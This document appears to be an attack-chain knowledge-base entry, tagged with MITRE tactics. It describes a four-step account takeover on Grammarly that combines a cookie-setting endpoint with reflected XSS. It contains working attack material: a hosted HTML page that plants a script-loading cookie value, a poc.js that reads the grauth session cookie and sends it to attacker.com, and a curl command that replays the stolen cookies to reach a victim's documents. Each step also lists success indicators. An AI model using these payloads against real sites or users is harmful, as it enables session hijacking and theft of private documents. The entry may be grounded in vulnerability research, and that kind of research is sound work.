---
tags:
  - xss
  - cookie-manipulation
  - account-takeover
  - session-hijacking
type: attack_chain
tools:
  - '[[tools/jQuery]]'
  - '[[tools/XMLHttpRequest]]'
  - '[[tools/curl]]'
  - '[[tools/Google-Chrome]]'
  - '[[tools/Mozilla-Firefox]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-access-victim-document]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Host-Malicious-Webpage-for-Cookie-Manipulation]]'
  - '[[procedures/Execute-XSS-Payload-to-Steal-Session-Cookies]]'
  - '[[procedures/Monitor-Server-Logs-for-Stolen-Cookies]]'
  - '[[procedures/Access-Victim-Account-with-Stolen-Cookies]]'
step_count: 4
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
description: >-
  Multi-stage attack exploiting cookie manipulation and reflected XSS to achieve
  full account takeover in Grammarly
skill_level: intermediate
impact_level: high
id: 4f0ab902-e879-4c9f-b72b-535f471e585f
created_at: '2025-12-14T00:11:16.526Z'
updated_at: '2025-12-14T00:11:16.526Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Account Takeover via Cookie Manipulation and Reflected XSS in Grammarly

Multi-stage attack chain demonstrating a complete workflow for exploiting a cookie manipulation endpoint combined with reflected XSS in Grammarly to steal session cookies and achieve account takeover.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Page] --> B[Execute XSS Payload]
    B --> C[Monitor Logs]
    C --> D[Access Account]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/jQuery]]
- [[tools/XMLHttpRequest]]
- [[tools/curl]]
- [[tools/Google-Chrome]]
- [[tools/Mozilla-Firefox]]

### Target Environment

- Web platform
- Access to Grammarly domains (www.grammarly.com, gnar.grammarly.com, app.grammarly.com)
- No specific ports or services required beyond HTTPS

### Initial Access Requirements

- Victim must visit the malicious webpage
- No prior credentials needed
- Network access to Grammarly endpoints

## Detailed Attack Procedures

### Step 1: Host Malicious Webpage
procedure: [[procedures/Host-Malicious-Webpage-for-Cookie-Manipulation]]

**Objective**: Set up a malicious HTTPS webpage to manipulate the gnar_containerId cookie and inject an XSS payload.

**Instructions**: Host an HTML page using [[tools/jQuery]] to send a POST request to https://gnar.grammarly.com/cookies, setting gnar_containerId to a value with script tags loading poc.js, then redirect to https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal.

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
$.post("https://gnar.grammarly.com/cookies", {name: "gnar_containerId", value: "<script src=\"https://attacker.com/poc.js\"></script>", domain: ".grammarly.com"});
window.location = "https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal";
</script>
```

**Expected Output**: Cookie set and user redirected to trigger XSS.

**Success Indicators**:
- POST request succeeds
- Redirect occurs without errors

### Step 2: Execute XSS Payload
procedure: [[procedures/Execute-XSS-Payload-to-Steal-Session-Cookies]]

**Objective**: Run the injected JavaScript to retrieve and exfiltrate the grauth cookie.

**Instructions**: The poc.js script uses [[tools/XMLHttpRequest]] to GET https://gnar.grammarly.com/cookies?name=grauth with credentials, then sends the response to the attacker's domain.

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://gnar.grammarly.com/cookies?name=grauth", true);
xhr.withCredentials = true;
xhr.onload = function() {
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", "https://attacker.com/?cookie=" + encodeURIComponent(xhr.responseText), true);
    xhr2.send();
};
xhr.send();
```

**Expected Output**: Cookie value exfiltrated to attacker's server.

**Success Indicators**:
- XSS executes in noscript tag
- GET request retrieves grauth cookie

### Step 3: Monitor Server Logs
procedure: [[procedures/Monitor-Server-Logs-for-Stolen-Cookies]]

**Objective**: Capture the stolen cookie from webserver logs.

**Instructions**: Check the attacker's webserver access logs for GET requests containing the cookie data in the query string.

**Expected Output**: Log entry with stolen grauth cookie value.

**Success Indicators**:
- Log shows incoming GET request with cookie parameter
- Cookie value is valid and not empty

### Step 4: Access Victim Account
procedure: [[procedures/Access-Victim-Account-with-Stolen-Cookies]]

**Objective**: Use stolen cookies to access victim's documents and demonstrate takeover.

**Instructions**: Use [[commands/curl-access-victim-document]] to send requests to app.grammarly.com with grauth and csrf-token cookies.

```bash
curl https://app.grammarly.com/ddocs/417782102 --cookie "grauth=STOLEN_GRAUTH_VALUE" --cookie "csrf-token=STOLEN_CSRF_VALUE" -I
```

**Expected Output**: HTTP 200 response indicating access.

**Success Indicators**:
- Successful response from endpoint
- Access to documents from any IP

## Attack Chain Summary

### Key Achievements

1. Bypassed HttpOnly flags via cookie endpoint
2. Injected and executed XSS payload
3. Stole session cookies for account takeover

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Credential Access]]

*Last updated: 2023-10-01*
